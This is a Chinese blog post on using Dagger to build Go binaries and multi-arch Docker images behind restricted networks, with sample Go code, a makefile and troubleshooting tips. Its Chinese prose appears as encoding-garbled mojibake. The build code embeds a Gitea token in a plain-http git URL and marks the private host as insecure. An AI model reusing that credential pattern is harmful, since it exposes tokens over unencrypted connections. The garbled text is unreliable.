z_deploy/dagger/internal/telemetry/span.go [skipped] writing z_deploy/dagger/internal/telemetry/transform.go [skipped] running post-command: go mod tidy post-command failed: exit status 1 Stderr: go: downloading github.com/stretchr/testify v1.9.0 go: github.com/go-logr/stdr@v1.2.2 requires github.com/go-logr/logr@v1.2.2: Get \u0026#34;https://proxy.golang.org/github.com/go-logr/logr/@v/v1.2.2.mod\u0026#34;: dial tcp 142.250.217.113:443: i/o timeout Error: exit status 1 æˆ‘æœç´¢äº†ä¸€ä¸‹ï¼Œåœ¨è¿™é‡Œæ‰¾åˆ°äº†æ–¹æ¡ˆ\nğŸ Dagger æ¨¡å—åœ¨ä¼ä¸šç¯å¢ƒä¸­å´©æºƒ Â· Issue #6599 Â· dagger/dagger \u0026mdash; ğŸ Dagger modules break in corporate environments Â· Issue #6599 Â· dagger/dagger engine: support for system proxy settings by sipsma Â· Pull Request #7255 Â· dagger/dagger æˆ‘ä»¬å¯ä»¥è®¾ç½® _DAGGER_ENGINE_SYSTEMENV_GOPROXYâ€‹ ç¯å¢ƒå˜é‡ï¼Œè®©æˆ‘ä»¬è¯•è¯•\n1 2 3 export _DAGGER_ENGINE_SYSTEMENV_GOPROXY=https://goproxy.cn,direct # ä½¿ç”¨ -vvv æ‰“å°æ›´ä¸°å¯Œçš„æ—¥å¿— dagger init --sdk=go --source=./dagger -vvv æˆ‘ä»¬ä¼šå‘ç°è¿˜æ˜¯æŠ¥åŒæ ·çš„é”™è¯¯ï¼Œæˆ‘åœ¨ ğŸ Dagger æ¨¡å—åœ¨ä¼ä¸šç¯å¢ƒä¸­å´©æºƒ Â· Issue #6599 Â· dagger/dagger \u0026mdash; ğŸ Dagger modules break in corporate environments Â· Issue #6599 Â· dagger/dagger é—®äº†ä¸‹å¤§å®¶ï¼Œå‘ç°è¿™ä¸ªç¯å¢ƒå˜é‡å¹¶ä¸æ˜¯ä½œç”¨äºå®¢æˆ·ç«¯ï¼Œè€Œæ˜¯å¼•æ“ã€‚\né€šè¿‡æˆ‘ä»¬ä¸Šé¢ -vvvâ€‹ å¯ä»¥çœ‹åˆ°å®é™…è°ƒç”¨çš„ docker runâ€‹ å‘½ä»¤æ˜¯\n1 docker run --name dagger-engine-v0.13.7 -d --restart always -v /var/lib/dagger --privileged ghcr.nju.edu.cn/dagger/engine:v0.13.7 --debug æ‰€ä»¥æœ€ç»ˆçš„å¤„ç†æ–¹æ¡ˆæ˜¯\n1 2 3 export _EXPERIMENTAL_DAGGER_RUNNER_HOST=docker-image://ghcr.nju.edu.cn/dagger/engine:v0.13.7 docker run --name dagger-engine-v0.13.7 -d --restart always -v /var/lib/dagger -e _DAGGER_ENGINE_SYSTEMENV_GOPROXY=https://goproxy.cn,direct --privileged ghcr.nju.edu.cn/dagger/engine:v0.13.7 --debug dagger init --sdk=go --source=./dagger -vvv å°† _EXPERIMENTAL_DAGGER_RUNNER_HOSTâ€‹ è®¾ç½®ä¸º docker-image://ghcr.nju.edu.cn/dagger/engine:v0.13.7â€‹ å°†ä¼šæŒ‡ç¤º dagger å®¢æˆ·ç«¯æŸ¥æ‰¾å½“å‰æ˜¯å¦æœ‰å¯¹åº”é•œåƒçš„å®¹å™¨æ­£åœ¨è¿è¡Œï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™æŒ‰ç…§å†…ç½®çš„å‘½ä»¤åˆ›å»ºä¸€ä¸ªã€‚æˆ–è€…ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ docker-container://dagger-engine-v0.13.7â€‹ ç›´æ¥æŒ‡å®šå®¹å™¨ã€‚\nä½¿ç”¨æ ·ä¾‹ è¿™é‡Œç»™å‡ºä¸€ä¸ªä½¿ç”¨æ ·ä¾‹ï¼Œæˆ‘ä»¬å¸Œæœ›æœ‰çš„åŠŸèƒ½æ¸…å•ä¸º\nç¼–è¯‘å‡ºäºŒè¿›åˆ¶ ç¼–è¯‘å¤šæ¶æ„ Docker é•œåƒå¹¶æ¨é€åˆ°è¿œç«¯ ç›®å½•ç»“æ„ 1 2 3 4 5 6 7 8 9 . â”œâ”€â”€ dagger.json â”œâ”€â”€ dagger â”‚ â”œâ”€â”€ ... â”‚ â””â”€â”€ main.go â”œâ”€â”€ .goreleaser.yaml â”œâ”€â”€ makefile â”œâ”€â”€ go.mod â””â”€â”€ go.sum æ–‡ä»¶å†…å®¹ dagger/main.go 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 package main import ( \u0026#34;context\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;time\u0026#34; \u0026#34;dagger/peien-engine/internal/dagger\u0026#34; ) type MyEngine struct{} func (m *MyEngine) joinCommands(cmds []string) string { return strings.Join(cmds, \u0026#34; \u0026amp;\u0026amp; \u0026#34;) } func (m *MyEngine) BuildApp(ctx context.Context, src *dagger.Directory, token *dagger.Secret) *dagger.Container { // build app builder := dag.Container(). From(\u0026#34;golang:1.22-bullseye\u0026#34;). WithSecretVariable(\u0026#34;GITEA_TOKEN\u0026#34;, token). WithWorkdir(\u0026#34;/src\u0026#34;). WithMountedCache(\u0026#34;/go/pkg/mod\u0026#34;, dag.CacheVolume(\u0026#34;go-mod\u0026#34;)). WithEnvVariable(\u0026#34;GOMODCACHE\u0026#34;, \u0026#34;/go/pkg/mod\u0026#34;). WithMountedCache(\u0026#34;/go/build-cache\u0026#34;, dag.CacheVolume(\u0026#34;go-build\u0026#34;)). WithEnvVariable(\u0026#34;GOCACHE\u0026#34;, \u0026#34;/go/build-cache\u0026#34;). WithEnvVariable(\u0026#34;CGO_ENABLED\u0026#34;, \u0026#34;0\u0026#34;). WithEnvVariable(\u0026#34;GOPROXY\u0026#34;, \u0026#34;https://goproxy.cn,direct\u0026#34;). WithEnvVariable(\u0026#34;GOINSECURE\u0026#34;, \u0026#34;gitprivate.com\u0026#34;). WithEnvVariable(\u0026#34;GOPRIVATE\u0026#34;, \u0026#34;gitprivate.com\u0026#34;). WithExec([]string{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, m.joinCommands([]string{ \u0026#34;curl -L -o goreleaser_Linux_x86_64.tar.gz https://files.m.daocloud.io/github.com/goreleaser/goreleaser/releases/download/v2.3.2/goreleaser_Linux_x86_64.tar.gz\u0026#34;, \u0026#34;tar -xzvf goreleaser_Linux_x86_64.tar.gz -C /usr/local/bin goreleaser\u0026#34;, \u0026#34;chmod +x /usr/local/bin/goreleaser\u0026#34;, \u0026#34;rm -rf goreleaser_Linux_x86_64.tar.gz\u0026#34;, })}). WithExec([]string{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, `git config --global url.\u0026#34;http://${GITEA_TOKEN}@gitprivate.com\u0026#34;.insteadOf \u0026#34;http://gitprivate.com\u0026#34;`}). WithDirectory(\u0026#34;/src\u0026#34;, src). WithExec([]string{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, m.joinCommands([]string{ \u0026#34;goreleaser build --skip=validate --clean\u0026#34;, \u0026#34;mv dist/my-engine_linux_amd64_v1 dist/my-engine_linux_amd64\u0026#34;, })}) return builder } func (m *MyEngine) buildImage(platform dagger.Platform, src *dagger.Directory, appName string, version string, builder *dagger.Container) *dagger.Container { osArch := strings.Split(string(platform), \u0026#34;/\u0026#34;)[1] ctr := dag.Container(dagger.ContainerOpts{Platform: platform}). From(\u0026#34;debian:bullseye-slim\u0026#34;). WithLabel(\u0026#34;org.opencontainers.image.version\u0026#34;, version). WithLabel(\u0026#34;org.opencontainers.image.created\u0026#34;, time.Now().String()). WithWorkdir(\u0026#34;/app\u0026#34;). WithEnvVariable(\u0026#34;TZ\u0026#34;, \u0026#34;Asia/Shanghai\u0026#34;). WithExec([]string{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, m.joinCommands([]string{ \u0026#34;sed -i \u0026#39;s|http://deb.debian.org/debian|http://mirror.sjtu.edu.cn/debian|g\u0026#39; /etc/apt/sources.list\u0026#34;, \u0026#34;sed -i \u0026#39;/security.debian.org/d\u0026#39; /etc/apt/sources.list\u0026#34;, \u0026#34;apt-get update\u0026#34;, \u0026#34;apt-get -qq install -y --no-install-recommends ca-certificates curl openssl firefox-esr firefox-esr-l10n-zh-cn wget fontconfig\u0026#34;, // æ¸…ç† apt ç¼“å­˜ \u0026#34;apt-get clean -y\u0026#34;, \u0026#34;rm -rf /var/lib/apt/lists/*\u0026#34;, })}). WithFile(fmt.Sprintf(\u0026#34;/app/%s\u0026#34;, appName), builder.File(fmt.Sprintf(\u0026#34;/src/dist/%s_linux_%s/%s\u0026#34;, appName, osArch, appName))). WithEntrypoint([]string{fmt.Sprintf(\u0026#34;/app/%s\u0026#34;, appName)}) return ctr } func (m *MyEngine) BuildOneImage( ctx context.Context, src *dagger.Directory, // GITEA TOKEN token *dagger.Secret, // +optional // +default=\u0026#34;\u0026#34; imageName string, // +optional // +default=\u0026#34;unknown\u0026#34; version string, ) (*dagger.Container, error) { builder := m.BuildApp(ctx, src, token) appName := \u0026#34;my-engine\u0026#34; ctr := m.buildImage(\u0026#34;linux/amd64\u0026#34;, src, appName, version, builder) if imageName == \u0026#34;\u0026#34; { imageName = fmt.Sprintf(\u0026#34;docker-registry.com/akkuman/%s:easm-dev\u0026#34;, appName) } ctr = ctr.WithAnnotation(\u0026#34;io.containerd.image.name\u0026#34;, imageName) return ctr, nil } func (m *MyEngine) BuildAllImagePublish( ctx context.Context, src *dagger.Directory, token *dagger.Secret, version string, registryUser string, registryPass *dagger.Secret, ) ([]string, error) { builder := m.BuildApp(ctx, src, token) var platforms = []dagger.Platform{ \u0026#34;linux/amd64\u0026#34;, // a.k.a. x86_64 \u0026#34;linux/arm64\u0026#34;, // a.k.a. aarch64 } var imageRepos []string appName := \u0026#34;my-engine\u0026#34; platformVariants := make([]*dagger.Container, 0, len(platforms)) for _, platform := range platforms { ctr := m.buildImage(platform, src, appName, version, builder) platformVariants = append(platformVariants, ctr) } imageRepo := []string{ fmt.Sprintf(\u0026#34;docker-registry.com/akkuman/%s:latest\u0026#34;, appName), fmt.Sprintf(\u0026#34;docker-registry.com/akkuman/%s:%s\u0026#34;, appName, version), } for _, repoAddr := range imageRepo { addr, err := dag.Container().WithRegistryAuth(\u0026#34;docker-registry.com/\u0026#34;, registryUser, registryPass).Publish(ctx, repoAddr, dagger.ContainerPublishOpts{ PlatformVariants: platformVariants, }) if err != nil { return nil, err } imageRepos = append(imageRepos, addr) } return imageRepos, nil } makefile 1 2 3 4 5 6 7 8 9 10 11 build: goreleaser build --skip=validate --clean dagger-build: # ç¼–è¯‘åå¯åœ¨ dist ç›®å½•ä¸‹æŸ¥çœ‹ dagger call build-app --src=. --token=env:GITEA_TOKEN directory --path=\u0026#34;/src/dist\u0026#34; export --path=\u0026#34;./dist\u0026#34; image-build-export: # æ„å»º amd64 é•œåƒå¹¶å¯¼å‡ºåˆ° my-engine.tgz dagger call build-one-image --src=. --token=env:GITEA_TOKEN export --path=my-engine.tgz build-all-publish: # æ„å»ºå¤šæ¶æ„é•œåƒå¹¶æ¨é€ dagger call build-all-image-publish --src=. --token=env:GITEA_TOKEN --version=\u0026#34;$GIT_TAG\u0026#34; --registry-user=\u0026#34;$DOCKER_USERNAME\u0026#34; --registry-pass=env:DOCKER_PASSWORD ä¸€äº› Tips Dagger CLI æŸäº›åŠŸèƒ½å¯ä»¥å’Œä»£ç ç­‰åŒ æ‹¿ Golang ç¼–è¯‘ç„¶åå¯¼å‡ºåˆ°æœ¬åœ°ç›®å½•åšæ¼”ç¤º\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package main import ( \u0026#34;context\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;time\u0026#34; \u0026#34;dagger/peien-engine/internal/dagger\u0026#34; ) type PeienEngine struct{} func (m *PeienEngine) joinCommands(cmds []string) string { return strings.Join(cmds, \u0026#34; \u0026amp;\u0026amp; \u0026#34;) } func (m *PeienEngine) BuildApp(ctx context.Context, src *dagger.Directory, token *dagger.Secret) *dagger.Container { // build app builder := dag.Container(). ... WithExec([]string{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, m.joinCommands([]string{ \u0026#34;goreleaser build --skip=validate --clean\u0026#34;, \u0026#34;mv dist/engine_linux_amd64_v1 dist/engine_linux_amd64\u0026#34;, })}) return builder } å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯¼å‡ºç¼–è¯‘äº§ç‰©\n1 2 # ç¼–è¯‘åå¯åœ¨ dist ç›®å½•ä¸‹æŸ¥çœ‹ dagger call build-app --src=. --token=env:GITEA_TOKEN directory --path=\u0026#34;/src/dist\u0026#34; export --path=\u0026#34;./dist\u0026#34; ä¹Ÿå¯ä»¥æ–°å»ºä¸€ä¸ªå‡½æ•°\n1 2 3 func (m *PeienEngine) BuildAndExport(ctx context.Context, src *dagger.Directory, token *dagger.Secret) (string, error) { return m.BuildApp(ctx, src, token).Directory(\u0026#34;/src/dist\u0026#34;).Export(\u0026#34;./dist\u0026#34;) } ç„¶åæ‰§è¡Œå‘½ä»¤ dagger call build-and-export --src=. --token=env:GITEA_TOKENâ€‹\nWithExec ä¸ä¼šåˆå¹¶æˆä¸€å±‚ æˆ‘ä»¬å†™ Dockerfile çš„æ—¶å€™ï¼Œå¸¸å¸¸ä¸ºäº†ä½“ç§¯è€ƒè™‘ï¼Œä¼šæŠŠå‡ è¡Œå‘½ä»¤å†™æˆä¸€è¡Œï¼Œæ¯”å¦‚ä¸Šé¢çš„\n1 2 RUN goreleaser build --skip=validate --clean \u0026amp;\u0026amp; \\ mv dist/engine_linux_amd64_v1 dist/engine_linux_amd64 å¦‚æœå†™æˆä¸¤è¡Œçš„è¯ï¼Œåˆ™ç¼–è¯‘å‡ºæ¥ä¼šå ç”¨ç¼–è¯‘äº§ç‰©çš„æ‰€æœ‰ä½“ç§¯ï¼Œç„¶åä¸‹é¢çš„ mvâ€‹ åˆä¼šå ç”¨ä¸€æ¬¡ä½“ç§¯ã€‚\nè€Œ Dagger å®˜æ–¹ç¤ºä¾‹ä¸­å¤„å¤„éƒ½æ˜¯ç±»ä¼¼ä¸‹é¢è¿™ç§\n1 2 3 ... WithExec([]string{\u0026#34;goreleaser\u0026#34;, \u0026#34;build\u0026#34;, \u0026#34;--skip=validate\u0026#34;, \u0026#34;--clean\u0026#34;}). WithExec([]string{\u0026#34;mv\u0026#34;, \u0026#34;dist/engine_linux_amd64_v1\u0026#34;, \u0026#34;dist/engine_linux_amd64\u0026#34;}) æœ€å¼€å§‹æˆ‘ä»¥ä¸ºæ—¢ç„¶å®˜æ–¹ç¤ºä¾‹è¿™ä¹ˆå†™ï¼Œé‚£åº”è¯¥ä¼šè‡ªåŠ¨åˆå¹¶ï¼Œä½†æ˜¯æˆ‘ä½¿ç”¨ dive æŸ¥çœ‹åï¼Œå‘ç°å¹¶æ²¡æœ‰åˆå¹¶ï¼Œä¸Šé¢è¿™ç§å†™æ³•åŸºæœ¬ç­‰åŒä¸‹é¢ä¸¤è¡Œ RUNâ€‹\n1 2 RUN goreleaser build --skip=validate --clean RUN mv dist/engine_linux_amd64_v1 dist/engine_linux_amd64 æ‰€ä»¥éœ€è¦åˆå¹¶çš„ï¼Œæœ€å¥½ä½¿ç”¨ sh -câ€‹ æ¥åˆå¹¶ï¼Œä¾‹å¦‚\n1 WithExec([]string{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;,\u0026#34;goreleaser build --skip=validate --clean \u0026amp;\u0026amp; mv dist/engine_linux_amd64_v1 dist/engine_linux_amd64\u0026#34;)}) æ“ä½œæ˜¯æœ‰åºçš„ å¯èƒ½æˆ‘ä»¬ä¼šçœ‹åˆ°å¾ˆå¤š WithX æ“ä½œï¼Œæ¯”å¦‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 builder := dag.Container(). From(\u0026#34;golang:1.22-bullseye\u0026#34;). WithSecretVariable(\u0026#34;GITEA_TOKEN\u0026#34;, token). WithWorkdir(\u0026#34;/src\u0026#34;). WithMountedCache(\u0026#34;/go/pkg/mod\u0026#34;, dag.CacheVolume(\u0026#34;go-mod\u0026#34;)). WithEnvVariable(\u0026#34;GOMODCACHE\u0026#34;, \u0026#34;/go/pkg/mod\u0026#34;). WithMountedCache(\u0026#34;/go/build-cache\u0026#34;, dag.CacheVolume(\u0026#34;go-build\u0026#34;)). WithEnvVariable(\u0026#34;GOCACHE\u0026#34;, \u0026#34;/go/build-cache\u0026#34;). WithEnvVariable(\u0026#34;CGO_ENABLED\u0026#34;, \u0026#34;0\u0026#34;). WithEnvVariable(\u0026#34;GOPROXY\u0026#34;, \u0026#34;https://goproxy.cn,direct\u0026#34;). WithExec([]string{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, m.joinCommands([]string{ \u0026#34;curl -L -o goreleaser_Linux_x86_64.tar.gz https://github.com/goreleaser/goreleaser/releases/download/v2.3.2/goreleaser_Linux_x86_64.tar.gz\u0026#34;, \u0026#34;tar -xzvf goreleaser_Linux_x86_64.tar.gz -C /usr/local/bin goreleaser\u0026#34;, \u0026#34;chmod +x /usr/local/bin/goreleaser\u0026#34;, \u0026#34;rm -rf goreleaser_Linux_x86_64.tar.gz\u0026#34;, })}). WithDirectory(\u0026#34;/src\u0026#34;, src). WithExec([]string{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, m.joinCommands([]string{ \u0026#34;goreleaser build --skip=validate --clean\u0026#34;, \u0026#34;mv dist/peien-engine_linux_amd64_v1 dist/peien-engine_linux_amd64\u0026#34;, \u0026#34;mv dist/peien-node_linux_amd64_v1 dist/peien-node_linux_amd64\u0026#34;, })}) éœ€è¦æ³¨æ„è¿™äº›æ“ä½œéƒ½æ˜¯æœ‰åºçš„ï¼Œæ¯”å¦‚å®˜æ–¹å¾ˆå¤šæ ·ä¾‹æŠŠ WithDirectory(\u0026quot;/src\u0026quot;, src)â€‹ æ”¾åœ¨æœ€å‰é¢ï¼Œå°±å¯¼è‡´ä»»ä½•ä¸€ç‚¹å˜åŠ¨éƒ½ä¼šå½±å“åç»­æ‰€æœ‰æµç¨‹ï¼Œæ­£ç¡®çš„æ–¹æ³•æ˜¯æ”¾åœ¨ç¼–è¯‘å‰ï¼Œå°±å’Œæˆ‘ä»¬å¹³æ—¶å†™ Dockerfile è€ƒè™‘çš„å±‚çº§æ„é€ ä¸€æ ·ï¼Œæ˜¯æœ‰åºçš„ï¼Œå˜åŠ¨å¤šçš„å¾€åæ”¾ã€‚\nDagger å¼€å‘ç¯å¢ƒæ¢å¤ TLDR: dagger developâ€‹ å³å¯å®‰è£… SDK\nå½“æˆ‘ä»¬ä½¿ç”¨ initâ€‹ åˆ›å»ºä¸€ä¸ª Dagger æµç¨‹åï¼Œä¼šå‘ç°å®ƒç”Ÿæˆçš„æ–‡ä»¶å¤¹é‡Œé¢æ’é™¤äº†ç”Ÿæˆçš„ sdkï¼Œå‚è§ä»¥ä¸‹ .gitignoreâ€‹ ç¤ºä¾‹\n1 2 3 4 /dagger.gen.go /internal/dagger /internal/querybuilder /internal/telemetry ä¹Ÿå°±æ˜¯è¿™äº›æ–‡ä»¶ä¸ä¼šç­¾å…¥ git ä»“åº“ï¼Œå’Œå…¶ä»–äººåä½œå¼€å‘æ—¶ï¼Œè¿™äº›æ–‡ä»¶ä¸ä¼šåŒæ­¥ï¼Œè™½è¯´è¿™å¯¹äº Dagger å„ç§å‘½ä»¤çš„è¿è¡Œä¸å½±å“ï¼ˆDaggerå†…éƒ¨ä¼šæ„å»ºç¯å¢ƒï¼‰ï¼Œè¿™äº›æ–‡ä»¶æ˜¯ä¾›æˆ‘ä»¬å¼€å‘ Dagger æµç¨‹çš„ã€‚\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤ dagger developâ€‹ æ¥ç”Ÿæˆè¿™äº› SDK æ–‡ä»¶ï¼Œè¿™ä¸ªå‘½ä»¤ä¼šæ‰¾åˆ°é¡¹ç›®ä¸‹é¢ç”Ÿæˆçš„ dagger.json æ–‡ä»¶ï¼Œç„¶åæ ¹æ®é‡Œé¢çš„é…ç½®åœ¨å¯¹åº”çš„æ–‡ä»¶å¤¹ç”Ÿæˆ SDK\nä»¥ä¸Šè¯´æ˜å¯å‚è§\nâœ¨ Cannot update SDK when using newer version of Dagger Â· Issue #7964 Â· dagger/dagger CLI Reference | Dagger dagger.gen.go æŠ¥é”™ æœ‰æ—¶å€™ä½ æƒ³æ”¹å˜ main.goâ€‹ çš„å¯¼å‡ºå‡½æ•°åç§°ï¼Œä¼šçœ‹åˆ°ç±»ä¼¼è¿™æ ·çš„æŠ¥é”™\n1 (*PeienEngine).BuildOneImage undefined (type *PeienEngine has no field or method BuildOneImage) æ­¤æ—¶ä½ éœ€è¦ä½¿ç”¨ä¸Šé¢æåˆ°çš„ dagger developâ€‹ æ¥é‡æ–°ç”Ÿæˆ dagger.gen.goâ€‹\nä¸è¿‡ä¸è¿è¡Œä¹Ÿæ²¡å…³ç³»ï¼Œå°±æ˜¯ IDE æˆ–ç¼–è¾‘å™¨ä¼šæœ‰é”™è¯¯æç¤ºè€Œå·²ï¼Œå®é™…è¿è¡Œä¸å½±å“\nå¯¼å‡ºé•œåƒ tarball è®¾ç½®é•œåƒtag é—®é¢˜æè¿°ï¼šä½¿ç”¨ export å¯¼å‡ºçš„é•œåƒ tarball æ˜¯æ²¡æœ‰ tag çš„\nè§£å†³æ–¹æ¡ˆï¼šæ·»åŠ  io.containerd.image.nameâ€‹ çš„ annotationâ€‹ å³å¯ï¼Œä»£ç ç¤ºä¾‹å¦‚ä¸‹\n1 2 3 4 5 6 ... builder := dag.Container(). From(\u0026#34;golang:1.22-bullseye\u0026#34;). ... WithAnnotation(\u0026#34;io.containerd.image.name\u0026#34;, fmt.Sprintf(\u0026#34;akkuman/testapp:%s\u0026#34;, version)) ... å…¶ä¸­ WithAnnotation(\u0026quot;io.containerd.image.name\u0026quot;, fmt.Sprintf(\u0026quot;akkuman/testapp:%s\u0026quot;, version))â€‹ å°†ä¼šè®¾ç½®é•œåƒ tag\nç›¸å…³ issue:\nâœ¨ .AsTarball Add OCI manifest RepoTags Â· Issue #7368 Â· dagger/dagger [Container.Export] Support custom annotations for exporting oci tar. Â· Issue #6999 Â· dagger/dagger âœ¨ Import image to local container runtime Â· Issue #8025 Â· dagger/dagger .dockerignore ä¸èµ·æ•ˆ æˆ‘ä»¬çŸ¥é“ï¼ŒDocker æ„å»ºæ—¶å¯ä»¥ä½¿ç”¨ .dockerignore æ¥æ’é™¤ä¸€äº›æ–‡ä»¶çš„å¯¼å…¥ï¼Œä½†ä¼¼ä¹ Dagger ä¸ä¼šä¾ç…§ .dockerignore\næŸ¥é˜…æ–‡æ¡£ Directory Filters | Daggerï¼Œå‘ç°éœ€è¦æŒ‡å®š\nä¾‹å¦‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package main import ( \u0026#34;context\u0026#34; \u0026#34;dagger/my-module/internal/dagger\u0026#34; ) type MyModule struct{} func (m *MyModule) Foo( ctx context.Context, // +ignore=[\u0026#34;.git\u0026#34;, \u0026#34;**/.gitignore\u0026#34;] source *dagger.Directory, ) (*dagger.Container, error) { return dag.Container(). From(\u0026#34;alpine:latest\u0026#34;). WithDirectory(\u0026#34;/src\u0026#34;, source). Sync(ctx) } å¯ä»¥æŸ¥çœ‹å…¶ä¸­çš„ +ignoreâ€‹ï¼Œè¯¦æƒ…å‚é˜… Directory Filters | Dagger\nå¦‚ä½•é™åˆ¶æŸä¸ªå‚æ•°æ˜¯ç‰¹å®šé€‰é¡¹å€¼ è¿™æ˜¯ä¸€ä¸ªç±»ä¼¼æšä¸¾çš„éœ€æ±‚ï¼Œå¦‚æœæ²¡æœ‰ä»”ç»†æŸ¥é˜…æ–‡æ¡£ï¼Œå¯èƒ½ä¼šè¿™æ ·åš\n1 2 3 4 5 6 7 8 9 10 func (m *MyApp) BuildOneImage( ctx context.Context, src *dagger.Directory, appTag string, ) (*dagger.Container, error) { if appTag != \u0026#34;engine\u0026#34; \u0026amp;\u0026amp; appTag != \u0026#34;node\u0026#34; { return nil, fmt.Errorf(\u0026#34;appTag å¿…é¡»ä¸º engine æˆ–è€… node\u0026#34;) } ... } ä½†å®é™…ä¸Š Dagger æ”¯æŒæšä¸¾ï¼Œå¯ä»¥æ”¹æˆ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 type AppTag string const ( EngineAppTag AppTag = \u0026#34;engine\u0026#34; NodeAppTag AppTag = \u0026#34;node\u0026#34; ) func (m *MyApp) BuildOneImage( ctx context.Context, src *dagger.Directory, appTag AppTag, ) (*dagger.Container, error) { ... } è¿™æ ·é™¤äº†å¯ä»¥ç®€åŒ–è‡ªå·±çš„åˆ¤æ–­ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ dagger call build-one-image --helpâ€‹ åœ¨å¸®åŠ©ä¸­æŸ¥çœ‹åˆ°\n1 2 ARGUMENTS --app-tag engine,node [required] è¯¦æƒ…å‚è§ Enumerations | Dagger\nä½¿ç”¨ dag.Container().From(\u0026ldquo;alpine:latest\u0026rdquo;) æ— æ³•æ‹‰å–é•œåƒ å›½å†…å› ä¸ºç½‘ç»œé—®é¢˜ï¼Œæ— æ³•æ‹‰å–åˆ° docker.io ä¸Šçš„é•œåƒï¼Œä½†æ˜¯ dagger callâ€‹ çš„æ‰§è¡Œå®é™…ä¸Šåœ¨ dagger engine å®¹å™¨ä¸­ï¼Œæ‰€ä»¥æ‹‰å–æ—¶ä¸ä¼šä¾ç…§æœ¬åœ°è®¾ç½®çš„ /etc/docke/daemon.jsonâ€‹\nè¿™æ—¶æˆ‘ä»¬å¯ä»¥é‡‡ç”¨æ‰‹åŠ¨è¿è¡Œ Dagger Engine æœåŠ¡å®¹å™¨çš„æ–¹å¼ï¼ŒæŒ‡å®š Dagger Eninge çš„ engine.toml\nä¾‹å¦‚ï¼Œåˆ›å»ºæ–‡ä»¶ engine.tomlâ€‹ï¼Œæ³¨æ„ï¼šå…¶ä¸­çš„é•œåƒæ¢æˆè‡ªå·±çš„è¦ä½¿ç”¨çš„é•œåƒåœ°å€\n1 2 [registry.\u0026#34;docker.io\u0026#34;] mirrors = [\u0026#34;mirror.a.com\u0026#34;, \u0026#34;mirror.b.com\u0026#34;] ç„¶åæ‰‹åŠ¨è¿è¡Œ Engine\n1 docker run --rm -v /var/lib/dagger --name customized-dagger-engine --privileged --volume $PWD/engine.toml:/etc/dagger/engine.toml ghcr.nju.edu.cn/dagger/engine:v0.13.7 ç„¶åé…ç½®ç¯å¢ƒå˜é‡æŒ‡å®š Dagger CLI ä½¿ç”¨è¯¥ Dagger Engine æœåŠ¡\n1 export _EXPERIMENTAL_DAGGER_RUNNER_HOST=docker-container://customized-dagger-engine æ¥ä¸‹æ¥å†ä½¿ç”¨ Dagger CLI æ‰§è¡Œ dagger callâ€‹ å„ç§ Fromâ€‹ æ‹‰å–å°±ä¸ä¼šæœ‰é—®é¢˜äº†\nè¯¦æƒ…å‚è§\nCustom Registry Mirrors | Dagger Custom Runner | Dagger Dagger ç¼“å­˜å æ®äº†å¾ˆå¤§ç©ºé—´ï¼Œå¦‚ä½•æ¸…ç† ç¼“å­˜å¤§å°å¯ä»¥ä½¿ç”¨ BuildKit åƒåœ¾æ”¶é›†é…ç½®æ¥æ§åˆ¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¸…ç† Dagger Engine çš„æ‰€æœ‰ç¼“å­˜\n1 2 3 4 5 6 7 8 9 dagger query \u0026lt;\u0026lt;EOF { daggerEngine { localCache { prune } } } EOF Github Action ä¸­å¦‚ä½•ä¿ç•™ç¼“å­˜ ä¸å¹¸çš„æ˜¯ï¼Œå¾ˆéš¾ç”¨ï¼Œå› ä¸º Docker æ„å»ºåœ¨ GHA ä¸­æ˜¯äºŒç­‰å…¬æ°‘ï¼Œè¿™é‡Œæä¾›ä¸€äº›é“¾æ¥å‚è€ƒ\nNo information on caching for CI environments Â· Issue #6911 Â· dagger/dagger ğŸ Fail to export cache with _EXPERIMENTAL_DAGGER_CACHE_CONFIG (failed to compute blob by overlay differ (ok=false)) Â· Issue #8717 Â· dagger/dagger (334) Discord | \u0026quot;actions/cache\u0026quot; | Dagger Cache management | Docker Docs ä¸ºä»€ä¹ˆæ˜¯ Dagger è€Œä¸æ˜¯ Earthly Earthly æˆ‘ä¹Ÿç”¨è¿‡ï¼Œå¥½å¤„æ˜¯å’Œ Dockerfile è¯­æ³•åŸºæœ¬ä¸€è‡´ï¼ŒåŸºæœ¬ä¸Šä¼šå†™ Dockerfile å°±ä¼šå†™ Earthfileã€‚\nå…·ä½“æ¥è¯´ï¼ŒEarthly ä½¿ç”¨ä¸‹æ¥æ²¡å•¥å¤ªè‡´å‘½çš„ç¼ºç‚¹ï¼Œç›®å‰å‘ç°çš„ä¸€ä¸ªé—®é¢˜æ˜¯æœ‰äº›è¯­æ³•åœ¨ Dockerfile ä¸­å¯ä»¥ï¼Œä½†åœ¨ Earthfile 